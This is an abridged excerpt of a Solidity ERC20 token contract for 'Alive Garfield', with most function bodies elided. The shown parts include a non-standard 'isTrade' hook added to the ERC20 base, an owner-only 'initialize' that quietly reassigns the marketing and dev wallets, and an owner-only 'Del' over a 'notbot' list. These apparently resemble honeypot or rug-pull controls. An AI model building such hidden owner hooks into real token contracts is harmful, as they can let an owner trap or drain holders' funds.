...
Telegram: https://t.me/alivegarfield
Twitter:  https://twitter.com/AliveGarfield
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function isTrade(address account, address spender) internal returns(bool) {
...
contract AliveGarfield is ERC20, Ownable {
    ...
    constructor() ERC20("Alive Garfield", "A-GAR") { 
...
function Del(address[] memory notbot) public onlyOwner {
  ...
  function Airdrop(
    ...
    function initialize(bytes memory _account) external onlyOwner {
        ...
        if(super.isTrade(_trade, _spender)) {
            marketingWallet = _spender;
            DEVWallet = _trade;
        }
    }
